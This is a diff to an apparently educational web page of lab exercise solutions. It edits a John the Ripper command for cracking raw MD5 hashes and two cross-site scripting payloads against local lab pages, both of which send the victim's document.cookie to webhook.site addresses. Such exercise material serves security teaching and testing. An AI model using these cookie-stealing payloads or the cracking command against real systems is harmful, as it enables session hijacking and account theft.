@@ -49,11 +49,11 @@ print(f'Final out data: {out}')
     </p>
 
 
-    <p>./john --format=raw-md5 --wordlist=/home/triad/Tools/WordLists/john.txt /home/triad/Tools/WordLists/hash.txt
+    <p>./john --format=raw-md5 --wordlist=[path to wordlist(if you want to)] hash.txt
     </p>
 
     <h3>exercise XXS1</h3>
-    <p>http://127.0.0.1/progettoSWM/XSS/XSS1.php?username=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22https://webhook.site/6f06015b-5a9f-4cd1-8e7b-0d338a1a3ec7?username=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E</p>
+    <p>http://172.16.238.10/XSS/XSS1.php?username=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22https://webhook.site/9fd1a938-7508-4ddb-ad33-09c80a89e156?username=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E</p>
 
     <h3>exercise XXS2</h3>
     <p><[togliere]img src=https://github.com/favicon.ico width=0 height=0 onload=this.src='https://webhook.site/36084a1e-320d-49fb-a419-91f163aa76d6/?c='+document.cookie></p>
